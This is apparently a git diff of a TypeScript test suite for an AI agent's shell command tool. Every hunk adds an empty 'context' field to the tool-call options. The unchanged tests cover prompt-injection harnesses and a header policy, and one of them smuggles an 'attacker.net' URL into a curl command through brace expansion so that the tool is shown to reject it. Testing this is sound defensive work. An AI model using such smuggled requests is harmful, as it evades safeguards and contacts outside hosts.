@@ -132,7 +132,12 @@ describe("executeCommand payload pointer via per-invocation env", () => {
         promptInjection: { id: "pi.shell.override" },
         toolCallDescription: "Run a shell harness with a payload file pointer",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     // The command runs verbatim — the pointer rides as per-invocation env.
@@ -187,7 +192,12 @@ describe("executeCommand prompt injection pointer", () => {
         promptInjection: { id: "__omit__" },
         toolCallDescription: "Command with a placeholder prompt-injection id",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(true);
@@ -261,7 +271,12 @@ describe("executeCommand prompt injection pointer", () => {
         timeout: 5,
         toolCallDescription: "Run a prompt-injection harness",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(capturedCommand).toBe(command);
@@ -301,7 +316,12 @@ describe("executeCommand prompt injection pointer", () => {
         promptInjection: { id: "pi.memory.only" },
         toolCallDescription: "Try to use a memory-only payload",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(false);
@@ -379,7 +399,12 @@ describe("executeCommand deadlines", () => {
         toolCallDescription: "Deadline contract test",
         ...input,
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     ) as Promise<unknown>;
   }
 
@@ -743,7 +768,11 @@ it.skipIf(process.platform === "win32")(
           promptInjection: { id: "pi.hidden" },
           toolCallDescription: "Verify hidden payload routing",
         },
-        { toolCallId: "hidden", messages: [] },
+        {
+          context: {},
+          toolCallId: "hidden",
+          messages: [],
+        },
       );
       expect(result).toMatchObject({
         success: true,
@@ -891,7 +920,12 @@ describe("execute_command timeout fields (canonical timeoutSeconds)", () => {
         toolCallDescription: "Timeout alias dispatch test",
         ...input,
       },
-      { toolCallId: "tc_alias", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_alias",
+        messages: [],
+        abortSignal: undefined,
+      },
     ) as Promise<unknown>;
   }
 
@@ -1030,7 +1064,12 @@ describe("required-header policy on redirected shell commands", () => {
         command,
         toolCallDescription: "Check the required-header boundary",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(false);
@@ -1061,7 +1100,12 @@ describe("required-header policy on redirected shell commands", () => {
         command: "curl -s https://example.com/api 2>&1",
         toolCallDescription: "Fetch with stderr merged onto stdout",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(true);
@@ -1077,7 +1121,12 @@ describe("required-header policy on redirected shell commands", () => {
         command: "curl -s https://example.com/api 2>&1 | tee scratchpad/o.txt",
         toolCallDescription: "Pipeline is still rejected",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(false);
@@ -1108,7 +1157,12 @@ describe("required-header policy on redirected shell commands", () => {
         toolCallDescription:
           "Windows shell must not carry injected headers here",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(false);
@@ -1139,7 +1193,12 @@ describe("required-header policy on redirected shell commands", () => {
         command: "curl https://example.com/a https:{//attacker.net/x,} 2>&1",
         toolCallDescription: "Brace reconstruction must fail closed",
       },
-      { toolCallId: "tc_test", messages: [], abortSignal: undefined },
+      {
+        context: {},
+        toolCallId: "tc_test",
+        messages: [],
+        abortSignal: undefined,
+      },
     )) as ExecuteCommandResult;
 
     expect(result.success).toBe(false);
